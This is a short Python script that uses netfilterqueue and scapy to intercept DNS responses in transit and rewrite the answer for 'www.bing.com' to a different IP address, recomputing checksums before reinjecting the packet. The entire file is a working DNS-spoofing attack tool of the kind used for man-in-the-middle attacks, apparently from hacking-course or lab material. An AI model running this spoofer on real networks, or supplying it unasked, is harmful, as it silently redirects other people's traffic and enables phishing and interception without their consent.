import netfilterqueue 
import scapy.all as scapy


def captured_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=scapy_packet[scapy.DNSQR].qname
        req='www.bing.com'
        if req.encode() in qname:
            print("[+] Spoofing Target.......")
            answer=scapy.DNSRR(rrname=qname, rdata='172.217.194.132')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

queue=netfilterqueue.NetfilterQueue() 
queue.bind(0,captured_packet)
queue.run() 